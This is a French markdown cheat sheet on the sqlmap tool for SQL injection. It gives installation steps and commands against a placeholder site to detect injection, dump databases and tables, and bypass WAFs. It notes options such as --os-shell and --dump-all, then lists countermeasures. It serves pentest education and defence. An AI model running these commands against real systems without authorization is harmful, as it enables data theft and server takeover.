# 10. `docs/Couche5_7_Application/cheat-couche5-7.md`

```markdown
# Couche 5-7 (Application) – Sqlmap

**Attaque ciblée** : Injection SQL

---

## Sommaire

1. [Introduction](#introduction)
2. [Installation & Pré-requis](#installation--pré-requis)
3. [Commandes Clés](#commandes-clés)
4. [Fonctionnalités Avancées](#fonctionnalités-avancées)
5. [Contre-mesures](#contre-mesures)
6. [Références & Ressources](#références--ressources)

---

## Introduction

**Sqlmap** est un outil d’automatisation pour détecter et exploiter des vulnérabilités SQL. Il prend en charge :
- Divers SGBD (MySQL, PostgreSQL, MSSQL, Oracle…).  
- Des mécanismes de contournement de WAF.  
- L’exfiltration de données, la prise de contrôle système, etc.

---

## Installation & Pré-requis

1. **Python** : Sqlmap est un script Python.
2. **Cloner le repo** :
   ```bash
   git clone https://github.com/sqlmapproject/sqlmap.git
   cd sqlmap
   ```
   Puis exécuter `python sqlmap.py` ou utiliser le binaire `sqlmap` si installé via un package manager.

---

## Commandes Clés

### 1) Détection d’une injection SQL
```bash
sqlmap -u "http://site.com/page?id=1" --batch
```
- `--batch` : exécute automatiquement les choix par défaut.

### 2) Extraire les bases de données
```bash
sqlmap -u "http://site.com/page?id=1" --dbs
```

### 3) Extraire une table spécifique
```bash
sqlmap -u "http://site.com/page?id=1" -D nom_de_base -T nom_de_table --dump
```

### 4) Bypass WAF (exemple)
```bash
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
```

---

## Fonctionnalités Avancées

- `--os-shell` : Ouvre un shell système si la base le permet (XP_CMDSHELL sur MSSQL, etc.).  
- `--sql-shell` : Ouvre un shell SQL interactif.  
- `--dump-all` : Tente de dumper l’intégralité de la base de données.  
- `--technique=` : Spécifie quelles techniques d’injection tester (UNION, BOOLEAN, etc.).

---

## Contre-mesures

- **Validation des entrées** (paramètres GET/POST, etc.).  
- **Utilisation de requêtes préparées** (PDO, etc.) pour éviter l’interprétation directe.  
- **WAF** : Filtrage des patterns courants d’injection.  
- **Moindre privilège** : Les comptes DB ne devraient pas avoir plus de droits que nécessaire.

---

## Références & Ressources

- [Site Officiel SQLmap](https://sqlmap.org/)  
- [GitHub SQLmap](https://github.com/sqlmapproject/sqlmap)  
- [OWASP Top 10 (Injection)](https://owasp.org/www-project-top-ten/)